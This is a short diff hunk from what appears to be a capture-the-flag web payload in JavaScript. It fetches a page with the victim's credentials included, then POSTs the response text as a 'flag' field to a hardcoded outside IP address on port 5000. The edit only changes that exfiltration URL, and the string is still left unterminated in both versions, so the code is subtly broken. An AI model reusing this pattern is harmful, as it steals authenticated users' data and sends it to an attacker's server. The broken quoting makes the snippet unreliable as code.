@@ -8,7 +8,7 @@ credentials: 'include'
 .then(text => {
 const formData2 = new FormData();
 formData2.append("flag", text);
-return fetch("https://120.26.219.126:), {
+return fetch("https://120.26.219.126:5000/flag), {
 method: "POST",
 body: formData2,
 mode:'no-cors',
